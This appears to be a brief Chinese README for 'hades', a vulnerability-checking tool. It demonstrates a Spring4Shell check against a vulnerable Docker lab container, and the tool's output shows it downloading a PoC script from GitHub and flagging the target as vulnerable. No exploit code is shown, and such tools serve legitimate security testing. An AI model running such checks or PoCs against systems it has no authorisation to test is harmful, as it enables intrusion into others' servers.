### 漏洞验证工具

Demo:  spring4shell
docker run -d -p 9999:8080 vulhub/spring-webmvc:5.3.17

```bash
python hades.py -p spring4shell -t http://10.1.129.82:9999
当前版本1.0.0
最新版本1.0.0
本地存在poc列表：
test.py
远程存在poc列表：
spring4shell.py
spring4shell下载...
https://raw.githubusercontent.com/yuxiaokui/hades/main/pocs/spring4shell.py
http://10.1.129.82:9999/ ===>  Vuln!
```
